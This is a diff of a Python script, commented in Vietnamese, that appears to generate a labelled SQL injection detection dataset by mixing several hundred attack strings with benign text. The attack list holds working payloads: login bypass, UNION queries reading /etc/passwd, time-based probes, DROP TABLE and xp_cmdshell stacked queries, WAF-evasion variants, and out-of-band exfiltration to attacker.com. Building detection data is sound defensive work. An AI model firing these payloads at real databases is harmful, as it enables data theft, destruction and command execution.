@@ -4,13 +4,15 @@ import os
 import random
 import string
 
-
+# --- CẤU HÌNH ---
 TOTAL_ROWS = 15000 
 OUTPUT_DIR = "../datasets/raw"
 
-# 1. KHO MẪU SQL INJECTION KHỔNG LỒ (>400 mẫu)
+# ==========================================
+# 1. KHO MẪU SQL INJECTION KHỔNG LỒ
+# ==========================================
 sqli_bases = [
-    # 1. AUTH BYPASS & GENERIC TAUTOLOGY (Cơ bản)-
+    # 1. AUTH BYPASS & GENERIC TAUTOLOGY
     "admin' --", "admin' #", "admin'/*", 
     "' OR '1'='1", "\" OR \"1\"=\"1", 
     "' OR 1=1 --", "' OR 1=1 #", "' OR 1=1/*",
@@ -32,7 +34,7 @@ sqli_bases = [
     "' OR 1=1 OR ''='",
     "admin' -- -", 
     
-    # 2. UNION BASED (Trích xuất dữ liệu)
+    # 2. UNION BASED
     "UNION SELECT 1", "UNION SELECT 1,2", "UNION SELECT 1,2,3", 
     "UNION SELECT 1,2,3,4", "UNION SELECT 1,2,3,4,5",
     "UNION SELECT 1,2,3,4,5,6", "UNION SELECT 1,2,3,4,5,6,7",
@@ -55,63 +57,45 @@ sqli_bases = [
     "' UNION SELECT 1, load_file('/etc/passwd'), 3 --",
     "1' UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema=database()--",
     
-    # 3. ERROR BASED (MySQL, MSSQL, PostgreSQL, Oracle)
-    # MySQL
+    # 3. ERROR BASED
     "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
     "' AND ExtractValue(1, CONCAT(0x5c, (SELECT user()), 0x5c)) --",
     "' AND UpdateXML(1, CONCAT(0x5c, (SELECT user()), 0x5c), 1) --",
     "1' AND 1=1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
     "EXP(~(SELECT*FROM(SELECT USER())a))",
     "BIGINT UNSIGNED value is out of range",
-    
-    # MSSQL
     "1' AND 1=CONVERT(int, @@version) --",
     "1' AND 1=CAST(@@version AS int) --",
     "1' AND 1=CAST((SELECT table_name FROM information_schema.tables TOP 1) AS int)--",
-    
-    # PostgreSQL
     "1' AND 1=CAST(version() AS int)--",
     "1'::int", 
     "1' AND 1=(SELECT 1/0)--",
-    
-    # Oracle
     "1' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version))--",
     "1' AND 1=ctxsys.drithsx.sn(1, (SELECT user FROM dual))--",
-    "1' OR 1=1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
 
-    # 4. BLIND & TIME BASED (Tấn công mù)
-    # MySQL
+    # 4. BLIND & TIME BASED
     "SLEEP(5)", "SLEEP(10)", 
     "1' AND SLEEP(5) --", "1' AND SLEEP(10) --",
     "' AND IF(1=1, SLEEP(5), 0) --", 
     "1' AND BENCHMARK(10000000,MD5(1)) --",
     "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-    
-    # PostgreSQL
     "pg_sleep(5)", "pg_sleep(10)", 
     "1' AND pg_sleep(5) --",
     "|| pg_sleep(5) --",
     "(SELECT 5 FROM pg_sleep(5))",
-    
-    # MSSQL
     "WAITFOR DELAY '0:0:5'", 
     "WAITFOR DELAY '0:0:10'", 
     "1'; WAITFOR DELAY '0:0:5'--",
     "1'; WAITFOR TIME '23:59:59'--",
-    
-    # Oracle
     "1' AND 1=dbms_pipe.receive_message('RDS', 5)--",
     "1' AND 1=dbms_lock.sleep(5)--",
-    
-    # Boolean Blind
     "1' AND SUBSTRING(version(),1,1)='5'",
     "1' AND SUBSTRING(user(),1,1)='r'",
     "1' AND ASCII(SUBSTRING(database(),1,1))>100",
     "1' AND 1=1", "1' AND 1=0",
     "id=1 AND (SELECT length(database()))=4",
     
-    # 5. STACKED QUERIES & RCE (Nguy hiểm nhất)
-
+    # 5. STACKED QUERIES & RCE
     "1; DROP TABLE users", "1; DROP TABLE logs", "1; DROP DATABASE test",
     "1'; DROP TABLE users--", "1'; TRUNCATE TABLE users--",
     "1'; DELETE FROM users WHERE 1=1--",
@@ -125,7 +109,7 @@ sqli_bases = [
     "1'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --",
     "1'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --",
     
-    # 6. WAF EVASION & OBFUSCATION (Lách luật)
+    # 6. WAF EVASION & OBFUSCATION
     "1 OR 1=1", "1/**/OR/**/1=1", "1%20OR%201=1", "1%09OR%091=1",
     "1%0AOR%0A1=1", "1+OR+1=1",
     "UN/**/ION SEL/**/ECT", "UNI/**/ON SEL/**/ECT",
@@ -144,7 +128,7 @@ sqli_bases = [
     "1' AND 1=1 AND 1=1",
     "/**/UNION/**/SELECT/**/",
     
-    # 7. INJECTION POINTS (Order By, Group By, Limit)
+    # 7. INJECTION POINTS
     "ORDER BY 1", "ORDER BY 10", "ORDER BY 100",
     "ORDER BY 1--", "ORDER BY 1#",
     "GROUP BY 1,2,3", "GROUP BY 1,2,3--",
@@ -153,15 +137,14 @@ sqli_bases = [
     "PROCEDURE ANALYSE()",
     "1 INTO OUTFILE",
     "1 INTO DUMPFILE",
-    
 
-    # 8. OUT OF BAND (OOB) - DNS Exfiltration
+    # 8. OUT OF BAND (OOB)
     "1'; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.attacker.com\\abc')); --",
     "1'; EXEC master..xp_dirtree '\\\\attacker.com\\foo' --",
     "1' AND (SELECT UTL_INADDR.get_host_address((SELECT user FROM dual)||'.attacker.com') FROM dual) IS NOT NULL--",
     "1' AND (SELECT UTL_HTTP.request('http://attacker.com/'||(SELECT user FROM dual)) FROM dual) IS NOT NULL--",
 
-    # 9. POLYGLOTS (Chuỗi gây lỗi đa năng)
+    # 9. POLYGLOTS & COMPLEX
     "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
     "1;SELECT pg_sleep(5);",
     "1 AND (SELECT * FROM (SELECT(SLEEP(5)))b)",
@@ -169,12 +152,21 @@ sqli_bases = [
     "1' OR '1'='1' /*",
     "1' OR 1=1 -- -",
     "admin' --",
-    "javascript:alert(1);//", # Đôi khi bị WAF chặn như SQLi
+    "javascript:alert(1);//", 
+    "UN/**/ION SEL/**/ECT", 
+    "SE/**/LECT * FROM users",
+    "UN/**/ION SELECT",
+    "UNION SEL/**/ECT",
+    "1'/**/OR/**/1=1",
+    "AD/**/MIN' --",
 ]
 
-# 2. KHO MẪU VÔ HẠI (NORMAL)
 
+# 2. KHO MẪU VÔ HẠI (NORMAL)
 normal_bases = [
+   
+    # --------------------------------------------------------
+
     # Giao tiếp thông thường
     "hello world", "hi there", "how are you?", "good morning", "good night",
     "thank you", "please help", "contact support", "where is the store?",
@@ -188,8 +180,10 @@ normal_bases = [
     "order #12345", "track order", "cancel order", "refund request",
     "add to cart", "checkout", "payment method", "shipping address",
     "coupon code", "discount voucher", "gift card",
+    "Select an item",
+    "Please select from the menu",
     
-    # Thông tin cá nhân (Dễ gây nhầm lẫn)
+    # Thông tin cá nhân
     "user@example.com", "admin@company.com", "support@website.com",
     "john.doe", "jane_doe", "my name is John", "I am an admin",
     "address: 123 Main St", "phone: 0909123456", "zip code: 700000",
@@ -218,7 +212,10 @@ normal_bases = [
     "Group of people", "Group chat", "Group work",
     "Limit: 100", "Offset: 0", "From time to time",
     "Create a new account", "Alter ego", "Grant permission",
-    "Revoke access", "Commit changes", "Rollback transaction"
+    "Revoke access", "Commit changes", "Rollback transaction",
+    "Union High School",
+    "Values are important",
+    "Delete this message"
 ]
 
 def random_str(length=5):
